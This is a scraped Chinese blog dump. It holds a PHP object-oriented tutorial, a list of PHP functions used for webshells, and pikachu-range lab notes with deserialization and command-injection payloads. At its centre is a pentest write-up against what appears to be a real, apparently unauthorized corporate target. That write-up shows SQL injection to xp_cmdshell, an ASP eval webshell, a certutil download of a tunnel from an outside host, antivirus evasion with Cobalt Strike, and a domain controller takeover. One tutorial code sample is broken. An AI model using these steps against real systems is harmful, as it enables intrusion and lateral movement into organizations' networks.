对象施加那些操作，开灯，关灯就是行为。 对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。 对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。 面向对象内容 类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。 对象 − 是类的实例。 成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。 成员函数 − 定义在类的内部，可用于访问对象的数据。 继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。 父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。 子类 − 一个类继承其他类称为子类，也可称为派生类。 多态 − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。 重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。 抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。 封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。 构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。 析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。 PHP 类定义PHP 定义类通常语法格式如下： 1234567891011&lt;?phpclass phpClass &#123; var $var1; var $var2 = \"constant string\"; function myfunc ($arg1, $arg2) &#123; [..] &#125; [..]&#125;?&gt; 解析如下： 类使用 class 关键字后加上类名定义。 类名后的一对大括号({})内可以定义变量和方法。 类的变量使用 var 来声明, 变量也可以初始化值。 函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。 实例123456789101112131415161718192021222324&lt;?phpclass Site &#123; /* 成员变量 */ var $url; var $title; /* 成员函数 */ function setUrl($par)&#123; $this-&gt;url = $par; &#125; function getUrl()&#123; echo $this-&gt;url . PHP_EOL; &#125; function setTitle($par)&#123; $this-&gt;title = $par; &#125; function getTitle()&#123; echo $this-&gt;title . PHP_EOL; &#125;&#125;?&gt; 变量 $this 代表自身的对象。 PHP_EOL 为换行符。 PHP 中创建对象类创建后，我们可以使用 new 运算符来实例化该类的对象： 123$runoob = new Site;$taobao = new Site;$google = new Site; 以上代码我们创建了三个对象，三个对象各自都是独立的，接下来我们来看看如何访问成员方法与成员变量。 调用成员方法在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量： 1234567891011121314151617// 调用成员函数，设置标题和URL$runoob-&gt;setTitle( \"菜鸟教程\" );$taobao-&gt;setTitle( \"淘宝\" );$google-&gt;setTitle( \"Google 搜索\" );$runoob-&gt;setUrl( 'www.runoob.com' );$taobao-&gt;setUrl( 'www.taobao.com' );$google-&gt;setUrl( 'www.google.com' );// 调用成员函数，获取标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl(); 完整代码如下： 实例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php class Site &#123; /* 成员变量 */ var $url; var $title; /* 成员函数 */ function setUrl($par)&#123; this-&gt;url = par; &#125; function getUrl()&#123; echo $this-&gt;url . PHP_EOL; &#125; function setTitle($par)&#123; this-&gt;title = par; &#125; function getTitle()&#123; echo $this-&gt;title . PHP_EOL; &#125; &#125; $runoob = new Site; $taobao = new Site; $google = new Site; // 调用成员函数，设置标题和URL $runoob-&gt;setTitle( \"菜鸟教程\" ); $taobao-&gt;setTitle( \"淘宝\" ); $google-&gt;setTitle( \"Google 搜索\" ); $runoob-&gt;setUrl( 'www.runoob.com' ); $taobao-&gt;setUrl( 'www.taobao.com' ); $google-&gt;setUrl( 'www.google.com' ); // 调用成员函数，获取标题和URL $runoob-&gt;getTitle(); $taobao-&gt;getTitle(); $google-&gt;getTitle(); $runoob-&gt;getUrl(); $taobao-&gt;getUrl(); $google-&gt;getUrl(); ?&gt; 运行实例 » 执行以上代码，输出结果为： 123456菜鸟教程淘宝Google 搜索www.runoob.comwww.taobao.comwww.google.com PHP 构造函数构造函数是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。 PHP 5 允许开发者在一个类中定义一个方法作为构造函数，语法格式如下： 1void __construct ([ mixed $args [, $... ]] ) 在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量： 1234function __construct( $par1, $par2 ) &#123; $this-&gt;url = $par1; $this-&gt;title = $par2;&#125; 现在我们就不需要再调用 setTitle 和 setUrl 方法了： 实例12345678910$runoob = new Site('www.runoob.com', '菜鸟教程'); $taobao = new Site('www.taobao.com', '淘宝'); $google = new Site('www.google.com', 'Google 搜索'); // 调用成员函数，获取标题和URL $runoob-&gt;getTitle(); $taobao-&gt;getTitle(); $google-&gt;getTitle(); $runoob-&gt;getUrl(); $taobao-&gt;getUrl(); $google-&gt;getUrl(); 运行实例 » 析构函数析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。 PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，其语法格式如下： 1void __destruct ( void ) 实例1234567891011121314&lt;?phpclass MyDestructableClass &#123; function __construct() &#123; print \"构造函数\\n\"; $this-&gt;name = \"MyDestructableClass\"; &#125; function __destruct() &#123; print \"销毁 \" . $this-&gt;name . \"\\n\"; &#125;&#125;$obj = new MyDestructableClass();?&gt; 执行以上代码，输出结果为： 12构造函数销毁 MyDestructableClass 继承PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下： 123class Child extends Parent &#123; // 代码部分&#125; 实例实例中 Child_Site 类继承了 Site 类，并扩展了功能： 12345678910111213&lt;?php // 子类扩展站点类别class Child_Site extends Site &#123; var $category; function setCate($par)&#123; $this-&gt;category = $par; &#125; function getCate()&#123; echo $this-&gt;category . PHP_EOL; &#125;&#125; 方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。 实例中重写了 getUrl 与 getTitle 方法： 123456789function getUrl() &#123; echo $this-&gt;url . PHP_EOL; return $this-&gt;url;&#125; function getTitle()&#123; echo $this-&gt;title . PHP_EOL; return $this-&gt;title;&#125; 访问控制PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。 public（公有）：公有的类成员可以在任何地方被访问。 protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。 private（私有）：私有的类成员则只能被其定义所在的类访问。 属性的访问控制类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php/** * Define MyClass */class MyClass&#123; public $public = 'Public'; protected $protected = 'Protected'; private $private = 'Private'; function printHello() &#123; echo $this-&gt;public; echo $this-&gt;protected; echo $this-&gt;private; &#125;&#125;$obj = new MyClass();echo $obj-&gt;public; // 这行能被正常执行echo $obj-&gt;protected; // 这行会产生一个致命错误echo $obj-&gt;private; // 这行也会产生一个致命错误$obj-&gt;printHello(); // 输出 Public、Protected 和 Private/** * Define MyClass2 */class MyClass2 extends MyClass&#123; // 可以对 public 和 protected 进行重定义，但 private 而不能 protected $protected = 'Protected2'; function printHello() &#123; echo $this-&gt;public; echo $this-&gt;protected; echo $this-&gt;private; &#125;&#125;$obj2 = new MyClass2();echo $obj2-&gt;public; // 这行能被正常执行echo $obj2-&gt;private; // 未定义 privateecho $obj2-&gt;protected; // 这行会产生一个致命错误$obj2-&gt;printHello(); // 输出 Public、Protected2 和 Undefined?&gt; 方法的访问控制类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?php/** * Define MyClass */class MyClass&#123; // 声明一个公有的构造函数 public function __construct() &#123; &#125; // 声明一个公有的方法 public function MyPublic() &#123; &#125; // 声明一个受保护的方法 protected function MyProtected() &#123; &#125; // 声明一个私有的方法 private function MyPrivate() &#123; &#125; // 此方法为公有 function Foo() &#123; $this-&gt;MyPublic(); $this-&gt;MyProtected(); $this-&gt;MyPrivate(); &#125;&#125;$myclass = new MyClass;$myclass-&gt;MyPublic(); // 这行能被正常执行$myclass-&gt;MyProtected(); // 这行会产生一个致命错误$myclass-&gt;MyPrivate(); // 这行会产生一个致命错误$myclass-&gt;Foo(); // 公有，受保护，私有都可以执行/** * Define MyClass2 */class MyClass2 extends MyClass&#123; // 此方法为公有 function Foo2() &#123; $this-&gt;MyPublic(); $this-&gt;MyProtected(); $this-&gt;MyPrivate(); // 这行会产生一个致命错误 &#125;&#125;$myclass2 = new MyClass2;$myclass2-&gt;MyPublic(); // 这行能被正常执行$myclass2-&gt;Foo2(); // 公有的和受保护的都可执行，但私有的不行class Bar &#123; public function test() &#123; $this-&gt;testPrivate(); $this-&gt;testPublic(); &#125; public function testPublic() &#123; echo \"Bar::testPublic\\n\"; &#125; private function testPrivate() &#123; echo \"Bar::testPrivate\\n\"; &#125;&#125;class Foo extends Bar &#123; public function testPublic() &#123; echo \"Foo::testPublic\\n\"; &#125; private function testPrivate() &#123; echo \"Foo::testPrivate\\n\"; &#125;&#125;$myFoo = new foo();$myFoo-&gt;test(); // Bar::testPrivate // Foo::testPublic?&gt; 接口使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。 接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。 接口中定义的所有方法都必须是公有，这是接口的特性。 要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。 1234567891011121314151617181920212223242526272829&lt;?php// 声明一个'iTemplate'接口interface iTemplate&#123; public function setVariable($name, $var); public function getHtml($template);&#125;// 实现接口class Template implements iTemplate&#123; private $vars = array(); public function setVariable($name, $var) &#123; $this-&gt;vars[$name] = $var; &#125; public function getHtml($template) &#123; foreach($this-&gt;vars as $name =&gt; $value) &#123; $template = str_replace('&#123;' . $name . '&#125;', $value, $template); &#125; return $template; &#125;&#125; 常量可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。 常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。 自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。 实例1234567891011121314151617181920&lt;?phpclass MyClass&#123; const constant = '常量值'; function showConstant() &#123; echo self::constant . PHP_EOL; &#125;&#125;echo MyClass::constant . PHP_EOL;$classname = \"MyClass\";echo $classname::constant . PHP_EOL; // 自 5.3.0 起$class = new MyClass();$class-&gt;showConstant();echo $class::constant . PHP_EOL; // 自 PHP 5.3.0 起?&gt; 抽象类任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。 定义为抽象的类不能被实例化。 被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。 继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpabstract class AbstractClass&#123; // 强制要求子类定义这些方法 abstract protected function getValue(); abstract protected function prefixValue($prefix); // 普通方法（非抽象方法） public function printOut() &#123; print $this-&gt;getValue() . PHP_EOL; &#125;&#125;class ConcreteClass1 extends AbstractClass&#123; protected function getValue() &#123; return \"ConcreteClass1\"; &#125; public function prefixValue($prefix) &#123; return \"&#123;$prefix&#125;ConcreteClass1\"; &#125;&#125;class ConcreteClass2 extends AbstractClass&#123; public function getValue() &#123; return \"ConcreteClass2\"; &#125; public function prefixValue($prefix) &#123; return \"&#123;$prefix&#125;ConcreteClass2\"; &#125;&#125;$class1 = new ConcreteClass1;$class1-&gt;printOut();echo $class1-&gt;prefixValue('FOO_') . PHP_EOL;$class2 = new ConcreteClass2;$class2-&gt;printOut();echo $class2-&gt;prefixValue('FOO_') . PHP_EOL;?&gt; 执行以上代码，输出结果为： 1234ConcreteClass1FOO_ConcreteClass1ConcreteClass2FOO_ConcreteClass2 此外，子类方法可以包含父类抽象方法中不存在的可选参数。 例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则也是可以正常运行的。 12345678910111213141516171819202122232425262728&lt;?phpabstract class AbstractClass&#123; // 我们的抽象方法仅需要定义需要的参数 abstract protected function prefixName($name);&#125;class ConcreteClass extends AbstractClass&#123; // 我们的子类可以定义父类签名中不存在的可选参数 public function prefixName($name, $separator = \".\") &#123; if ($name == \"Pacman\") &#123; $prefix = \"Mr\"; &#125; elseif ($name == \"Pacwoman\") &#123; $prefix = \"Mrs\"; &#125; else &#123; $prefix = \"\"; &#125; return \"&#123;$prefix&#125;&#123;$separator&#125; &#123;$name&#125;\"; &#125;&#125;$class = new ConcreteClass;echo $class-&gt;prefixName(\"Pacman\"), \"\\n\";echo $class-&gt;prefixName(\"Pacwoman\"), \"\\n\";?&gt; 输出结果为： 12Mr. PacmanMrs. Pacwoman Static 关键字声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。 静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。 由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。 静态属性不可以由对象通过 -&gt; 操作符来访问。 自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。 1234567891011121314&lt;?phpclass Foo &#123; public static $my_static = 'foo'; public function staticValue() &#123; return self::$my_static; &#125;&#125;print Foo::$my_static . PHP_EOL;$foo = new Foo();print $foo-&gt;staticValue() . PHP_EOL;?&gt; 执行以上程序，输出结果为： 12foofoo Final 关键字PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。 以下代码执行会报错： 123456789101112131415161718&lt;?phpclass BaseClass &#123; public function test() &#123; echo \"BaseClass::test() called\" . PHP_EOL; &#125; final public function moreTesting() &#123; echo \"BaseClass::moreTesting() called\" . PHP_EOL; &#125;&#125;class ChildClass extends BaseClass &#123; public function moreTesting() &#123; echo \"ChildClass::moreTesting() called\" . PHP_EOL; &#125;&#125;// 报错信息 Fatal error: Cannot override final method BaseClass::moreTesting()?&gt; 调用父类构造方法PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() 。 12345678910111213141516171819202122232425&lt;?phpclass BaseClass &#123; function __construct() &#123; print \"BaseClass 类中构造方法\" . PHP_EOL; &#125;&#125;class SubClass extends BaseClass &#123; function __construct() &#123; parent::__construct(); // 子类构造方法不能自动调用父类的构造方法 print \"SubClass 类中构造方法\" . PHP_EOL; &#125;&#125;class OtherSubClass extends BaseClass &#123; // 继承 BaseClass 的构造方法&#125;// 调用 BaseClass 构造方法$obj = new BaseClass();// 调用 BaseClass、SubClass 构造方法$obj = new SubClass();// 调用 BaseClass 构造方法$obj = new OtherSubClass();?&gt; 执行以上程序，输出结果为： 1234BaseClass 类中构造方法BaseClass 类中构造方法SubClass 类中构造方法BaseClass 类中构造方法 PHP代码执行函数总结 PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞，这里对代码执行函数做一些归纳。 常见代码执行函数，如 eval()、assert()、preg_replace()、create_function() array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort() 文件操作函数、动态函数（$a($b)）","categories":[{"name":"PHP","slug":"PHP","permalink":"/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"/tags/PHP/"}]},{"title":"由一句“内网见”引发的内网渗透","slug":"由一句“内网见”引发的内网渗透","date":"2019-04-15T04:00:00.000Z","updated":"2019-04-24T13:17:44.218Z","comments":true,"path":"2019/04/15/由一句“内网见”引发的内网渗透/","link":"","permalink":"/2019/04/15/%E7%94%B1%E4%B8%80%E5%8F%A5%E2%80%9C%E5%86%85%E7%BD%91%E8%A7%81%E2%80%9D%E5%BC%95%E5%8F%91%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"师兄在练手的一个站，把主站扔了出来，说了一声内网见。","text":"师兄在练手的一个站，把主站扔了出来，说了一声内网见。 前期信息采集whois没搜集到什么有用的信息。 收集目标ip尝试ping查看ip。 出现ip，在浏览器中添加ip+80端口访问试试。能正常访问，真实ip没跑了。 NmapNmap扫一波端口，万一有可直接getshell的漏洞呢（例如445，永恒之蓝漏洞）只开了80,443端口IIS7.5,Windows系统，asp语言 旁站收集同ip下没什么旁站了，就开始动手了。 web渗透随便看了看一些界面，手工检测一下是否存在漏洞。 有传参，测试一下。单引号’闭合，and 1=1判断，- -注释sql语句后面的字符。返还结果正常。 and 1=2，返还结果。典型的布尔注入。 sql注入直接扔sqlmap结果出来了。得到更深一步信息（系统：Windows2008 R2，数据库：SqlServer 2008）。 查看是否是dba权限（我习惯存在注入第一件事是就是判断是否是dba权限，因为如果是，进程就进了很大一步）。运气真好！ sql注入 os-shell本地执行–os-shell的时候可能是延迟太高了吧，跑着跑着就返还web状态码500。这时候我只能分两步进行了，我在本地返还sql-shell没问题，后来我在vps跑os-shell没问题。 这时候分两步讲了，我开始只有sql-shell，师兄说dba注入点 无非就三条路，第一 找密码进后台 第二 直接写shell 第三 dump密码链接数据库（开启外联）。 写shell最直接快捷了， 创建临时表 http://www.xxxx.com/detail.asp?Prod=085500528&apos;;CREATE TABLE tt_tmp (tmp1 varchar(8000));--这步也可以在浏览器执行，不过是布尔注入，没有报错注入的回显，就不知道是否完成创表操作，所以我在sql—shell执行，有回显。以下操作同理，在浏览器执行数据库操作的时候只要做好闭合和注释就可以。在sql-shell执行就像对数据库操作一样的语句： CREATE TABLE tt_tmp (tmp1 varchar(8000)) 开启xp_cmdshell可能是我执行–os-shell的时候已经开启了，只是没有弹shell回来，但是我可以跳过这一步。 遍历文件夹查询特殊的asp文件（web端显示的文件名），插入表中，获取网站物理路径。 insert into tt_tmp(tmp1) exec master..xp_cmdshell &apos;for /r d:\\ %i in (detail*.aspx) do @echo %i &apos;后面这句命令 for /r d:\\ %i in (detail*.aspx) do @echo %i 在Windows执行的效果是这样的。他会遍历整个文件夹，查找匹配的文件名输出。 结果出来了，不过这里我犯了一个错误，只是我后来才发现的，因为延迟太高，我没等所有结果都出来，就直接停止，我以为这就是物理路径。导致我后来写shell的时候一直访问不到。 执行xp_cmdshell写一句话木马这步还没进行，我vps的os-shell就弹回来了。 os-shellos-shell回来以后，我直接写一句话木马，但是不解析，于是我又执行了一次这条命令。 for /r d:\\ %i in (detail*.aspx) do @echo %i 这时候网站真实的物理路径出来了。d:\\XXXXX\\ 二话不说，写马。 echo ^&lt;%eval request(&quot;sb&quot;)%^&gt; &gt;d:\\XXXXX\\XXXXX.asp这里有点小建议，当我们执行一些命令的时候可以现在本地尝试，我在这次渗透过程中就犯了这样的错误，我直接将命令执行，提示错误，有的时候我总觉得是那边的问题，其实我本身的命令就已经出错了。这里是重点。 这里的^是因为&gt;在cmd命令不能直接执行需要^注释一下。 后来师兄说也可以将命令写在””内就可以。 echo &quot;&lt;%eval request(&quot;sb&quot;)%&gt;&quot; &gt;d:\\XXXXX\\XXXXXX.asp这马一写上就被秒杀了，于是我用了一个大小写混合的马。就免杀了。（这种杀软还真是low，其实我也挺low的。） 内网渗透一句话木马也上了，os-shell也是最高权限了，这台机器也算拿下了。web渗透算是告一段落了。 因为其实我也不是很会内网渗透吧，这次算是第一次认真的内网渗透。所以我的思路就是先搭建代理，然后在搞。 虽然我没搞过内网渗透，但是我牢牢记住了大佬的一句话，内网渗透的本质是信息收集。 代理搭建本想直接小马的权限上传reGeorg进行代理。小马的权限真是低得可怜。无上传权限，无修改权限。连命令有些都不能执行。 这时候我脑海浮起了师兄说得那句话：权限至高无上。嘴角45°上扬，泛起了一抹微笑。2333333333333我的sql的xp_cmdshell是最高权限。我用一句下载命令将我的代理文件下载到了web中： certutil -urlcache -split -f http://xxxxxxx.com/tunnel.aspx d:\\XXXXX\\tunnel.aspxreGeorg+proxychains内网渗透走起！！！ 信息收集本来应该先查看系统关于内网的基本信息，但是我在翻找网站配置文件的时候，收获到意外发现。 两个数据库的账号密码。虽然我也不知道他为什么连两个数据库。当前系统的ip是10.1.1.2 尝试一下连接10.1.1.1数据库。看看能不能连上. 可以连上，尝试连接过去开启xp_cmdshell,然后查看权限。 第二台。拿下 这样就拿下两台了，接下来得开启我漫长的内网渗透之旅了。开始内网的基本信息收集。自己对内网不是很了解，只好找找文章，看看别人的思路了。翻阅很多篇文章，我觉得有篇文章思路很适合现在该目标的渗透测试。 域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。 ——摘抄自干货！内网渗透测试之域渗透详解！收藏！ 小小免杀（插曲）查看进程的时候发现存在的杀软是ESET杀软，所以尝试过一下免杀。 我打算上一个Cobalt Strike的shell过去，这样可以更好的进行内网渗透。做个小小的捆绑免杀，教程是学长分享的。 本地测试没问题。 注入到资源管理器进程后，会有一个新的会话产生，关闭putty.exe进程，也不影响控制。 Cobalt Strike检测结果： 能过杀软的文件检测。 Cobalt Strike本地杀软检测：会话弹回，无杀软提示。 翻阅文件夹时，出现杀软提示。 会话丢失。 后来学长说msfconsole的shell，可以过该杀软的检测。我便开始继续着手本地复现。教程 msfconsole检测结果：依旧能过杀软文件检测。 msfconsole本地杀软检测：本地运行，直接提示，会话都弹不回来，我都懵逼了。 这时候，我就只能动用特殊方法了。（一阵操作之后） ok！ Cobalt Strike的shell弹回来了。 开始信息搜集10.1.1.2 1net user 1hostname 当前主机名 1net view /domain 当前域 1ipconfig /all 想看一下dns，一般来说（特殊情况除外），dns的地址是域控的ip地址。ping的时候没有出现ip地址。其实应该是乱码吧。 在网上找到一个方法可以确定域控ip 1dsquery server 但是在目标上执行不成功。就放弃了。 10.1.1.1 1net user 出现意外发现。 竟然是台域控机器。 1net view /domain 当前域 1net view #显示当前域或工作组中计算机的列表 自此，内网渗透的一部分已经结束。 总结 其实旁站搜集的时候没有做的完全，师兄说这是一个很大的内网，很大的公司，他买下了多个ip段，C段有好几个web也都是他们 内网部分存在多个域，我拿下的只是其中一个域。 很多操作尽量做好本地测试以后再进行实际操作，可以减少误解。 ——未完待续——","categories":[{"name":"渗透日志","slug":"渗透日志","permalink":"/categories/%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"靶场练习-4","slug":"靶场练习-4","date":"2019-03-10T16:00:00.000Z","updated":"2019-04-27T07:55:26.861Z","comments":true,"path":"2019/03/11/靶场练习-4/","link":"","permalink":"/2019/03/11/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-4/","excerpt":"在pikachu靶场练习一下，复习一下漏洞。","text":"在pikachu靶场练习一下，复习一下漏洞。 PHP反序列化在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。序列化serialize()序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:pikachu:变量值 class S{ public $test=&quot;pikachu&quot;; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;} O:代表object 1:代表对象名字长度为一个字符 S:对象的名称 1:代表对象里面有一个变量 s:数据类型 4:变量名称的长度 test:变量名称 s:数据类型 7:变量值的长度反序列化unserialize() 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 12$u=unserialize(\"O:1:\"S\":1:&#123;s:4:\"test\";s:7:\"pikachu\";&#125;\"); echo $u-&gt;test; //得到的结果为pikachu 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 1234567891011121314151617181920212223常见的几个魔法函数: __construct()当一个对象创建时被调用 __destruct()当一个对象销毁时被调用 __toString()当一个对象被当作一个字符串使用 __sleep() 在对象在被序列化之前运行 __wakeup将在序列化之后立即被调用 漏洞举例: class S&#123; var $test = \"pikachu\"; function __destruct()&#123; echo $this-&gt;test; &#125; &#125; $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:&#123;s:4:\"test\";s:29:\"&lt;script&gt;alert('xss')&lt;/script&gt;\";&#125; XXEXXE -“xml external entity injection”既”xml外部实体注入漏洞”。概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。 具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。 本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。 URL重定向不安全的url跳转 不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。 url跳转比较直接的危害是:–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站 SSRFSSRF(Server-Side Request Forgery:服务器端请求伪造) 其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据 数据流:攻击者—–&gt;服务器—-&gt;目标地址 根据后台使用的函数的不同,对应的影响和利用方法又有不一样 1234PHP中下面函数的使用不当会导致SSRF:file_get_contents()fsockopen()curl_exec() ​ 如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。 你可以根据”SSRF”里面的项目来搞懂问题的原因 后话后面PHP反序列化和XXE还有SSRF还不是很理解，找个时间去做一次复现。","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"靶场练习-3","slug":"靶场练习-3","date":"2019-03-09T16:00:00.000Z","updated":"2019-03-09T10:15:37.325Z","comments":true,"path":"2019/03/10/靶场练习-3/","link":"","permalink":"/2019/03/10/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-3/","excerpt":"在pikachu靶场练习一下，复习一下漏洞。","text":"在pikachu靶场练习一下，复习一下漏洞。 RCE概述：RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 远程系统命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口 比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_- 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。 exec “ping”这里是在前端可以执行一个ping的操作。 我们可以拼接一个查看系统ip的操作。 192.168.61.125 &amp; ipconfig exec “eval”远程代码执行漏洞。对于前端输入的文本进行eval输出。看一下代码。对前端输入的txt进行eval输出。 File Inclusion(文件包含漏洞)文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了： include(),include_once() require(),require_once() 这些文件包含函数，这些函数在代码设计中被经常使用到。 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况： 